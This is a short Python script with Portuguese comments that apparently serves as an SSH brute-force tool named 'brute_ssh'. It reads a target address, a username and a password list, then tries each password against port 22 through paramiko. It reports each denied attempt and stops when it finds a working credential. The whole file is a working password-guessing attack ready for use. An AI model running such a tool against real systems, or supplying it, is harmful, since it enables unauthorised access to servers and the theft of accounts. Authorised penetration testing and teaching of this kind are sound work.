#!/usr/bin/python

# Bibliotecas
import paramiko,sys,re

# Constantes para facilitar a utilização das cores
class bcolors:
    GREEN = '\033[32;1m'
    BLUE = '\033[34;1m'
    YELLOW = '\033[33;1m'
    RED = '\033[31;1m'
    RED_BLINK = '\033[31;5;1m'
    END = '\033[m'

# Se a qtd de args for diferente de 4
if len(sys.argv) != 4:
    print (bcolors.RED + "\n ┏┓ ┏━┓╻ ╻╺┳╸┏━╸   ┏━┓┏━┓╻ ╻ " + bcolors.END)
    print (bcolors.RED + " ┣┻┓┣┳┛┃ ┃ ┃ ┣╸    ┗━┓┗━┓┣━┫ " + bcolors.END)
    print (bcolors.RED + " ┗━┛╹┗╸┗━┛ ╹ ┗━╸" + bcolors.END + bcolors.RED_BLINK + "╺━╸" + bcolors.END + bcolors.RED + "┗━┛┗━┛╹ ╹ " + bcolors.END)
    print (bcolors.BLUE + "\n [!] How to use:" + bcolors.END)
    print (bcolors.GREEN + "     python3 " + sys.argv[0] + " 10.12.92.1 user passwords.txt" + bcolors.END)
    sys.exit()

# Salva os argumentos em variaveis
alvo = sys.argv[1]
usuario = sys.argv[2]

# Abre a lista do argumento de senhas
f = open(sys.argv[3])

# Exibe o banner e indica qual eh o alvo
print (bcolors.RED + "\n ┏┓ ┏━┓╻ ╻╺┳╸┏━╸   ┏━┓┏━┓╻ ╻ " + bcolors.END)
print (bcolors.RED + " ┣┻┓┣┳┛┃ ┃ ┃ ┣╸    ┗━┓┗━┓┣━┫ " + bcolors.END)
print (bcolors.RED + " ┗━┛╹┗╸┗━┛ ╹ ┗━╸" + bcolors.END + bcolors.RED_BLINK + "╺━╸" + bcolors.END + bcolors.RED + "┗━┛┗━┛╹ ╹ " + bcolors.END)
print (bcolors.YELLOW + "\n [*] Target %s:%s\n"%(alvo,"22") + bcolors.END)

# Laco de repeticao para testar as senhas
for palavra in f.readlines():
    # Le palavra e remove quebras de linha
    senha = palavra.strip()
    # Atribui ao shh a funcao de client ssh
    ssh = paramiko.SSHClient()
    # Checar as chaves do sistema em busca de hosts conhecidos (/root/.ssh/know_hosts)
    ssh.load_system_host_keys()
    # O que fazer caso nao houver chaves cadastradas e hosts conhecidos? adicionar automaticamente
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Tenta conectar no server
    try:
        ssh.connect(str(alvo), username=str(usuario), password=str(senha), port='22')
    except paramiko.ssh_exception.AuthenticationException:
        print (bcolors.RED + " [!] Denied" + bcolors.END + " - User: %s | Password: %s"%(usuario,senha))
    else:
        print (bcolors.GREEN + " [+] Found" + bcolors.END + "  - User: %s | Password: %s"%(usuario,senha))
        sys.exit()
    # Fechamos a conexao
    ssh.close()
